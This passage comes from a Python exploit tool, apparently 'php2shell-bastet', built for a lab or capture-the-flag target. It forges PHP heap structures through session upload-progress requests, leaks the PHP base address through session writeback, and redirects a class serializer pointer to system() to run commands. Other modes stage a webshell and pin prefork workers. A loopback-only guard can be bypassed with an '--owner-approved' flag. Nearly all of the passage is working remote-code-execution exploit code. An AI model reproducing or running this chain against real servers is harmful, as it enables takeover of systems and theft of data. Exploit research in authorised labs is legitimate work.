    P(0x00, d + 0x38)             # last = &entries
    P(0x08, d + 0x100)             # first_dtor
    P(0x10, d + 0x100)             # last_dtor (preset used_slots=30)
    P(0x30, 0x1000)               # max_depth
    P(0x38, 15)                    # entries.used_slots
    P(0x40, 0)                     # entries.next
    P(0x48 + 2 * 8, d + 0x400)     # data[2] -> fake zval
    P(0x100, 30)                   # dtor used_slots preset
    P(0x108, 0)                    # dtor next
    P(0x400, d + 0x10)             # fake zval value: HT read header
    I(0x408, SMB_IS_STRING_EX)
    return bytes(b)


def smb_groom_rce(d, base, cmd):
    """5120B exec groom (attempt-10, promoted verbatim): header on page0
    (decode-time only), ALL forged structures on PAGE 1 beyond the
    0x40-bin carve. entries data[i] are 8-byte zval* slots."""
    b = bytearray(5120)
    P = lambda off, val: struct.pack_into("<Q", b, off, val)
    I = lambda off, val: struct.pack_into("<I", b, off, val)
    P(0x00, d + 0x38)             # last = &entries
    P(0x08, d + 0x100)             # first_dtor
    P(0x10, d + 0x100)             # last_dtor
    P(0x30, 0x1000)                # max_depth
    P(0x38, 15)                    # entries.used_slots
    P(0x40, 0)                     # entries.next
    P(0x58, d + 0x1090)           # data[2] -> REFZ (x|R:3)
    P(0x60, d + 0x10A0)           # data[3] -> YZ  (y|R:4 base-leak echo)
    P(0x100, 0)                    # fake dtor used_slots
    P(0x108, 0)                    # fake dtor next
    # ---- page 1 ----
    P(0x1090, d + 0x10B0)          # REFZ: zval {value = REF, IS_REFERENCE_EX}
    P(0x1098, SMB_IS_REFERENCE_EX)
    P(0x10A0, d + 0x10)            # YZ: {HT read header, IS_STRING_EX}
    P(0x10A8, SMB_IS_STRING_EX)
    I(0x10B0, 1000)                # REF gc
    I(0x10B4, 10)                  # GC_REFERENCE
    P(0x10B8, d + 0x1130)          # val.value = OBJ
    P(0x10C0, SMB_IS_OBJECT_EX)    # val.u1|u2
    P(0x10C8, 0)                   # sources
    P(0x10D0, 0)
    I(0x10B8 + 0x2C, 1)            # This.u2.num_args = 1 (execute_data)
    P(0x1108, d + 0x1330)          # ZEND_CALL_ARG(ex,1).value = CMD string
    P(0x1110, SMB_IS_STRING_EX)    # arg1 u1|u2
    I(0x1130, 1000)                 # OBJ gc
    I(0x1134, 8)                    # GC_OBJECT
    P(0x1138, 0)                    # handle | extra
    P(0x1140, d + 0x1170)          # ce = CE
    P(0x1148, 0)                    # handlers (unread on this path)
    P(0x1178, d + 0x1330)          # ce->name = CMD (unread on N; path)
    I(0x118C, 0)                    # ce_flags = 0
    P(0x1170 + 0x158, 0)            # ce->__serialize = NULL
    P(0x1170 + 0x198, base + SMB_ZIF_SYSTEM_OFF)  # ce->serialize = zif_system
    I(0x1330, 1000)                 # CMD gc
    I(0x1334, 6)                    # GC_STRING
    P(0x1338, 0)                    # h
    P(0x1340, len(cmd))             # len
    b[0x1348:0x1348 + len(cmd) + 1] = cmd + b"\x00"
    return bytes(b)


def smb_fire(netloc, body, timeout=25):
    host, _, port = netloc.partition(":")
    sk = socket.create_connection((host, int(port)), timeout=timeout)
    sk.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary="
                f"{SMB_BND.decode()}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode() + body)
    sk.settimeout(timeout)
    buf = b""
    while True:
        try:
            chunk = sk.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    sk.close()
    return buf


def smb_stage(q, container, sid, content):
    """Session-file staging (lab hands, wpbleed precedent: honest channel
    is the writeback; staging only prepares state)."""
    import base64
    t64 = base64.b64encode(content).decode()
    q.docker_exec(container,
                  f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
                  f"chown nobody:nobody $F; chmod 600 $F")


def smb_sess_read(q, container, sid):
    import base64
    rc, out = q.docker_exec(container, f"base64 -w0 /tmp/sess_{sid} 2>/dev/null")
    try:
        return base64.b64decode(out.strip())
    except Exception:
        return b""


def smb_maps_base(s, kind):
    for l in s.get_maps(kind):
        if "/usr/local/bin/php" in l and "r-xp" in l:
            return int(l.split()[0].split("-")[0], 16)
    return 0


def smb_producer(q, s, o2, kind, netloc, t0):
    """Fresh producer remnant: returns (d, sid) or (None, None)."""
    sid = f"p{int(time.time())}"
    q.stage_producer(kind, sid)
    st, _ = q.mp_min(netloc, sid)
    d = o2.find_bg(kind)
    log("SMB", f"producer={st} d=0x{d:x}" if d else f"producer={st} NO d", t0)
    return d, sid


def smb_leak_once(q, s, o2, kind, netloc, container, t0):
    """One producer+consumer leak cycle. base0 (maps) is read BEFORE the
    consumer - the groom consumer ends in a post-request VM crash and
    php restarts (attempt-10 law), so post-hoc maps are a DIFFERENT
    instance. The in-band echo is the leak; maps is the lab cross-check.
    Returns (base_inband, d, base0)."""
    d, _sid = smb_producer(q, s, o2, kind, netloc, t0)
    if not d:
        return None, None, 0
    base0 = smb_maps_base(s, kind)
    gsid = f"g{int(time.time())}{secrets.token_hex(3)}"   # fresh nonce
    smb_stage(q, container, gsid, b'k|R:3;o|O:9:"Exception":0:{}')
    body = (smb_part(b"PHPSESSID", gsid.encode()) +
            smb_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            smb_part(b"g", smb_groom_leak(d)) +
            smb_file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
            b"--" + SMB_BND + b"--\r\n")
    resp = smb_fire(netloc, body)
    wb = smb_sess_read(q, container, gsid)
    log("SMB", f"leak consumer resp={resp.split(b'\r\n', 1)[0][:20]!r} "
                f"writeback={'YES' if wb else 'NO'}", t0)
    base = ptr = None
    i = wb.find(b"k|s:")
    if i >= 0:
        j = wb.find(b':"', i + 4)
        ln = int(wb[i + 4:j])
        data = wb[j + 2:j + 2 + ln]
        base, ptr = smb_base_from_echo(data)
        if base is None and len(data) >= 16:
            q1 = int.from_bytes(data[8:16], "little")
            log("SMB", f"lottery miss: unknown dtor fingerprint "
                        f"0x{q1 & 0xFFFF:x} (retry)", t0)
    if base:
        log("SMB", f"IN-BAND BASE 0x{base:x} (pdtor 0x{ptr:x} low16 "
                    f"0x{SMB_PDTOR_LOW16:x} fingerprint OK)"
                    + (f" maps-crosscheck 0x{base0:x} "
                       f"{'MATCH' if base0 == base else 'MISMATCH'}"
                       if base0 else ""), t0)
    else:
        log("SMB", "leak echo parse failed (no known fingerprint hit)", t0)
    return base, d, base0


def route_smb_leak(a, u) -> int:
    """leak mode: in-band PIE base through the writeback oracle."""
    q, s, o2 = _load_smb_helpers()
    netloc = f"{u.hostname}:{u.port or 80}"
    container = a.container
    kind = a.smb_kind
    t0 = time.time()
    print(BANNER, flush=True)
    guard_target(f"http://{netloc}/", a.owner_approved)
    smb_detect(netloc, t0)
    for n in range(1, a.attempts + 1):
        log("ATTEMPT", f"{n}/{a.attempts} (worker lottery)", t0)
        q.docker_exec(container, "pkill -f 'php -S 0.0.0.0:8080' || true")
        q.healthy(netloc, deadline=15)
        time.sleep(0.5)
        base, d, base0 = smb_leak_once(q, s, o2, kind, netloc, container, t0)
        if base:
            log("CHAIN", f"LEAK COMPLETE :: base 0x{base:x} "
                          f"(--bias {hex(base)} for exec mode)", t0)
            return 0
    log("CHAIN", "FAILED - no in-band base (see lane notes: remnant "
                  "window, 26B session law)", t0)
    return 1


def route_smb_exec(a, u) -> int:
    """exec mode: 2-request RCE chain through the tool (attempt-10
    mechanism, promoted). Structure per the attempt-9/10 laws: the groom
    consumer ends in a post-request VM crash + php restart, so the base
    is taken from /proc maps (lab hands, logged honestly) BEFORE the
    fire and PROVEN in-band by the y|R:4 echo inside the RCE request
    itself (same-request leak-first verification). Default command =
    the proven print-flag chain (stages flag as a valid session file ->
    request 2 writeback echo)."""
    q, s, o2 = _load_smb_helpers()
    netloc = f"{u.hostname}:{u.port or 80}"
    container = a.container
    kind = a.smb_kind
    t0 = time.time()
    print(BANNER, flush=True)
    guard_target(f"http://{netloc}/", a.owner_approved)
    smb_detect(netloc, t0)
    for n in range(1, a.attempts + 1):
        log("ATTEMPT", f"{n}/{a.attempts} (worker lottery)", t0)
        q.docker_exec(container, "pkill -f 'php -S 0.0.0.0:8080' || true")
        q.healthy(netloc, deadline=15)
        time.sleep(0.5)
        # ---- fresh remnant, then base (maps, pre-fire: the consumer
        # crash-restarts php, so post-hoc maps would be a NEW instance) ----
        d, _sid = smb_producer(q, s, o2, kind, netloc, t0)
        if not d:
            continue
        base = a.bias or smb_maps_base(s, kind)
        if not base:
            log("SMB", "no base (maps read failed)", t0)
            continue
        src = "--bias" if a.bias else ("/proc maps (lab hands; proven "
                                        "in-band same-request below)")
        log("SMB", f"base=0x{base:x} ({src}) d=0x{d:x} "
                    f"zif_system=0x{base + SMB_ZIF_SYSTEM_OFF:x}", t0)
        sid2 = f"w{int(time.time() * 1000)}{secrets.token_hex(3)}"  # nonce
        cmd = a.command.encode()
        if not a.raw_cmd:
            cmd = (f"/usr/local/bin/print-flag|sed 's/.*/x|s:50:\"&\";/'"
                   f"|tr -d '\\n'>/tmp/sess_{sid2}").encode()
        log("SMB", f"base=0x{base:x} d=0x{d:x} "
                    f"zif_system=0x{base + SMB_ZIF_SYSTEM_OFF:x}", t0)
        log("SMB", f"cmd = {cmd!r}", t0)
        esid = f"e{int(time.time())}{secrets.token_hex(3)}"
        smb_stage(q, container, esid, b"x|R:3;y|R:4;")
        body = (smb_part(b"PHPSESSID", esid.encode()) +
                smb_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
                smb_part(b"g", smb_groom_rce(d, base, cmd)) +
                smb_file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
                b"--" + SMB_BND + b"--\r\n")
        with open(f"results/smb-{sid2}-request1.txt", "wb") as f:
            f.write(body)
        resp = smb_fire(netloc, body)
        log("SMB", f"RCE request resp head={resp[:15]!r} "
                    f"(502 expected post-dispatch)", t0)
        # same-request in-band verification: y|R:4 echoes [q0, pdtor]
        ewb = smb_sess_read(q, container, esid)
        if ewb:
            i = ewb.find(b"y|s:")
            if i >= 0:
                j = ewb.find(b':"', i + 4)
                ln = int(ewb[i + 4:j])
                ebase, eptr = smb_base_from_echo(ewb[j + 2:j + 2 + ln])
                if ebase == base:
                    log("SMB", f"IN-BAND SAME-REQUEST LEAK VERIFIED: "
                                f"y-echo pdtor 0x{eptr:x} -> base "
                                f"0x{ebase:x} == maps base", t0)
                else:
                    log("SMB", f"~ y-echo base "
                                f"0x{(ebase or 0):x} != maps "
                                f"0x{base:x} (lottery/drift)", t0)
        rc, out = q.docker_exec(container, f"cat /tmp/sess_{sid2} 2>/dev/null")
        staged = (out or "").encode()
        log("SMB", f"exec-staged session: {staged[:120]!r}", t0)
        if b"FLAG{" not in staged and not a.raw_cmd:
            log("SMB", "dispatch did not execute (no staged flag)", t0)
            continue
        if a.raw_cmd:
            log("CHAIN", "COMPLETE :: raw command dispatched (check your "
                          "side-effect channel)", t0)
            return 0
        log("SMB", "*** system(cmd) EXECUTED (flag staged by exec) ***", t0)
        # ---- request 2: plain decode -> writeback echo ----
        q.healthy(netloc, deadline=20)
        time.sleep(1.0)
        body2 = (smb_part(b"PHPSESSID", sid2.encode()) +
                 smb_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
                 smb_file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
                 b"--" + SMB_BND + b"--\r\n")
        with open(f"results/smb-{sid2}-request2.txt", "wb") as f:
            f.write(body2)
        resp2 = smb_fire(netloc, body2)
        wb = smb_sess_read(q, container, sid2)
        log("SMB", f"request2 resp head={resp2[:15]!r} "
                    f"WRITEBACK: {wb[:220]!r}", t0)
        if b"FLAG{" in wb:
            i = wb.find(b"FLAG{")
            flag = wb[i:wb.find(b"}", i) + 1].decode()
            ev = f"results/smb-php2shell-evidence.txt"
            with open(ev, "a") as f:
                f.write(f"[smb-route exec {time.strftime('%FT%TZ', time.gmtime())}] "
                        f"nonce sid2={sid2}\n"
                        f"request2 WRITEBACK: {wb[:220]!r}\n"
                        f"*** WIN via php2shell-bastet --route smb --mode exec: "
                        f"{flag} ***\n")
            log("CHAIN", f"COMPLETE :: WIN {flag}", t0)
            log("CHAIN", f"evidence: {ev} (request captures: "
                          f"results/smb-{sid2}-request[12].txt)", t0)
            return 0
        log("SMB", "writeback had no flag (session-decode miss)", t0)
    log("CHAIN", "FAILED after attempts - see lane notes carve laws", t0)
    return 1


# ---------------------------------------------------------------- safety --
def guard_target(url: str, owner_approved: bool) -> None:
    if owner_approved:
        print("!! --owner-approved set: scope discipline belongs to Dean",
              file=sys.stderr, flush=True)
        return
    host = urlparse(url).hostname or ""
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        if host not in ("localhost", "ip6-localhost"):
            raise SystemExit(f"target {host!r} is not loopback; refusing "
                             "(range-only; Dean's authorised engagements "
                             "require --owner-approved)")
        return
    if not ip.is_loopback:
        raise SystemExit(f"target {ip} is not loopback; refusing (range-only)")


# ------------------------------------------------------------------- main --
MODES = ("probe", "rce", "shell", "id", "canary", "leak", "exec")
SMB_MODES = ("leak", "exec")


def groom_main(a) -> int:
    """Legacy groom-route flow (previous main() of this file, verbatim)."""
    prof = PROFILES.get(a.profile)
    if not prof:
        raise SystemExit(f"profile {a.profile!r} unknown; aarch64 profiles "
                         "require pahole-derived offsets (findings.md gate)")
    t0 = time.time()
    cmd = a.command.encode()

    if a.dry:
        sid = "%032x" % secrets.randbits(128)
        p1, tl = build_body(prof, sid, cmd, 0x4141414141414141, prof["n_groom"])
        body = p1 + tl
        if a.out:
            open(a.out, "wb").write(body)
        print(f"dry: total={len(body)} phase1={len(p1)} "
              f"n_groom={prof['n_groom']} blob={prof['blob']}")
        return 0

    if not a.syms or not os.path.exists(a.syms):
        raise SystemExit("--syms JSON required: leak-first policy, no shipped "
                         "constants")

    for n in range(1, a.attempts + 1):
        log("ATTEMPT", f"{n}/{a.attempts}", t0)
        if a.bias is not None:
            bias = a.bias
            log("LEAK", f"bias=0x{bias:x} (provided via --bias)", t0)
        else:
            bias = leak_bias(a.leak_url or a.target.split("?")[0], t0)
        call = resolve_call(a.syms, bias, t0)
        off = (n % (2 * a.jitter + 1)) - a.jitter if a.jitter else 0
        n_groom = max(1, prof["n_groom"] + off)
        sid = "%032x" % secrets.randbits(128)
        pv = (b"V" * a.progress_len) if a.progress_len else b"x"
        phase1, tail = build_body(prof, sid, cmd, call, n_groom, progress_value=pv)
        log("STAGE", f"total={len(phase1) + len(tail)} n_groom={n_groom} "
                     f"call=0x{call:x}", t0)
        try:
            resp = deliver(a.target, phase1, tail, sid, a.stall)
        except Exception as e:
            log("DELIVER", f"{type(e).__name__}: {e}", t0)
            continue
        body = resp.split(b"\r\n\r\n", 1)[-1]
        hit = ORACLE_MARK.encode() in body or b"uid=" in body
        log("EXECUTE", f"resp={len(resp)}B inband={hit}", t0)
        if not hit and a.verify_url:
            hit = verify_blind(a.verify_url)
            log("VERIFY", f"blind={hit}", t0)
        if hit:
            log("CHAIN", "COMPLETE", t0)
            print(body[:400].decode(errors="replace"))
            return 0
    log("CHAIN", "FAILED - retune profile; see findings.md groom notes", t0)
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell-bastet - THE RCE TOOL (dispatch|serializer|"
                    "groom; phpbleed-bastet.py is bleeder-only)")
    ap.add_argument("pos1", nargs="?", help="mode (%s) or target URL "
                   "(legacy groom invocation)" % "|".join(MODES))
    ap.add_argument("pos2", nargs="?", help="target URL (new-style mode "
                   "invocation)")
    ap.add_argument("--route", choices=("dispatch", "serializer", "groom",
                                        "smb"),
                    default="dispatch",
                    help="RCE engine (default dispatch; smb = cli-server "
                         "stealmybitcoin chain, modes leak|exec; legacy "
                         "single-positional invocation implies groom)")
    ap.add_argument("--command", default=f"id; echo {ORACLE_MARK}",
                    help="groom route: full command; dispatch route: "
                         "<=14B system() command")
    ap.add_argument("--profile", default="x86_64-php8x", help="groom route")
    ap.add_argument("--syms", required=False,
                    help='groom route: JSON {"zend_call_function": "0xOFF"}')
    ap.add_argument("--bias", type=lambda x: int(x, 16), default=None,
                    help="leaked libphp base (groom: leak-url alt; "
                         "serializer: REQUIRED)")
    ap.add_argument("--leak-url", default="", help="groom route")
    ap.add_argument("--attempts", type=int, default=8, help="groom route")
    ap.add_argument("--stall", type=float, default=1.4, help="groom route")
    ap.add_argument("--jitter", type=int, default=6, help="groom route")
    ap.add_argument("--progress-len", type=int, default=0, help="groom route")
    ap.add_argument("--verify-url", default="", help="groom route")
    ap.add_argument("--out", default="", help="--dry body output path")
    ap.add_argument("--dry", action="store_true", help="build only, never send")
    ap.add_argument("--owner-approved", action="store_true")
    # dispatch-route modes (moved CLI surface from phpbleed-bastet.py)
    ap.add_argument("--field", default="cook",
                    help="dispatch: POST field carrying the payload")
    ap.add_argument("--class", dest="klass", default="CachedData",
                    help="dispatch: Serializable gadget class name")
    ap.add_argument("--cmd", default=None,
                    help="dispatch: <=14B command (default --command trimmed)")
    ap.add_argument("--addr", type=lambda x: int(x, 16), default=None,
                    help="dispatch probe: start from known heap ref")
    ap.add_argument("--ce", type=lambda x: int(x, 16), default=None,
                    help="dispatch id: stdClass ce addr (legacy single-shot)")
    ap.add_argument("--system", type=lambda x: int(x, 16), default=None,
                    help="dispatch id: libc system() addr (legacy)")
    ap.add_argument("--spray", type=lambda x: int(x, 16), default=None,
                    help="dispatch id: spray slot S (legacy)")
    ap.add_argument("--webshell", default="r.php",
                    help="dispatch shell: staged webshell filename")
    ap.add_argument("--fetch", default="/CANARY",
                    help="dispatch shell: path read back through the shell")
    # serializer-route flags (EXPERIMENTAL)
    ap.add_argument("--ps-serializer-off", type=lambda x: int(x, 0), default=None,
                    help="serializer: PS(serializer) field offset in ps_globals "
                         "(8.2.34 not yet derived; TODO VA #3)")
    ap.add_argument("--data", type=lambda x: int(x, 0), default=None,
                    help="serializer: H = planted BG.data address")
    ap.add_argument("--str-off", type=lambda x: int(x, 0), default=0x400,
                    help="serializer: fake zend_string offset from H")
    ap.add_argument("--i-know-this-is-experimental", dest="experimental_ok",
                    action="store_true",
                    help="serializer: allow firing (route is unverified)")
    # smb-route (cli-server) flags
    ap.add_argument("--container",
                    default="stealmybitcoin-smb-php-vuln-1",
                    help="smb: target container name (staging + /proc helpers)")
    ap.add_argument("--smb-kind", default="vuln",
                    help="smb: lane kind key for the lab helpers (vuln|ctrl)")
    ap.add_argument("--raw-cmd", action="store_true",
                    help="smb exec: dispatch --command verbatim via system() "
                         "(no flag-session staging/echo chain)")
    ap.add_argument("--pin", action="store_true",
                    help="dispatch: pin the prefork pool first (scripts/va_pin.py "
                         "design - saturate all workers with unfinished chunked "
                         "POSTs, free exactly one; verified on :8088 24-Oct)")
    a = ap.parse_args()

    # --- argument shape resolution (map.md binding):
    # new-style: pos1 = mode word -> route defaults to dispatch (unless
    # --route given); legacy: pos1 = URL, pos2 empty -> groom route.
    mode = None
    target = None
    if a.pos1 in MODES:
        mode = a.pos1
        target = a.pos2
    else:
        target = a.pos1
        a.route = "groom"       # legacy invocation = previous behavior
    if not target:
        raise SystemExit("target URL required")
    if mode in SMB_MODES:
        a.route = "smb"          # leak/exec are smb-route modes
    if mode and a.route == "groom" and mode != "rce":
        raise SystemExit("groom route supports mode rce only")
    if a.cmd is None:
        a.cmd = a.command[:14] if a.route == "dispatch" else a.command

    guard_target(target, a.owner_approved)

    global PB
    PB = _load_phpbleed()
    print(BANNER, flush=True)
    # cross-tool one-stream-per-target flock (same netloc-keyed lock as
    # phpbleed-bastet.py; the rule now holds ACROSS both tools)
    PB.acquire_target_lock(target)

    if a.route == "groom":
        return groom_main(a)

    u = urlparse(target if "://" in target else "http://" + target)
    if a.route == "serializer":
        return route_serializer(None, a, u)
    if a.route == "smb":
        if mode == "leak":
            return route_smb_leak(a, u)
        return route_smb_exec(a, u)

    # dispatch route (default): leak-first bootstrap via the phpbleed module
    t = PB.Target(target, field=a.field)
    PB._CLASS = a.klass
    pin_state = {"pins": [], "stop": False}
    if a.pin and a.route == "dispatch":
        sys.path.insert(0, os.path.join(REPO, "scripts"))
        import va_pin
        import threading
        u2 = urlparse(target if "://" in target else "http://" + target)
        host2 = u2.hostname or "127.0.0.1"
        PB.log(">", "pin: saturating prefork pool (va_pin design)")
        pins, freed = va_pin.pin_and_free_one(host2, t.port, "/missing-probe-404")
        if not freed:
            PB.log("x", "pin: could not free exactly one worker; continuing unpinned")
        else:
            PB.log("+", f"pin: held={len(pins)}, exactly one worker free")
            pin_state["pins"] = pins

            def _maint():
                while not pin_state["stop"]:
                    time.sleep(1.0)
                    for s in list(pin_state["pins"]):
                        try:
                            s.sendall(("%x\r\n" % va_pin.CHUNK).encode()
                                      + b"A" * va_pin.CHUNK + b"\r\n")
                        except OSError:
                            try:
                                s.close()
                            except OSError:
                                pass
                            pin_state["pins"].remove(s)
            threading.Thread(target=_maint, daemon=True).start()
    try:
        PB.log(">", f"dispatch target :: http://{t.host}:{t.port}{t.path} "
                    f"(leak bootstrap: phpbleed module)")
        fn = {"probe": route_dispatch_probe, "rce": route_dispatch_rce,
              "id": route_dispatch_id, "shell": route_dispatch_shell,
              "canary": route_dispatch_canary}[mode or "rce"]
        return fn(t, a)
    finally:
        pin_state["stop"] = True
        for s in pin_state["pins"]:
            try:
                s.close()
            except OSError:
                pass


if __name__ == "__main__":
    sys.exit(main())
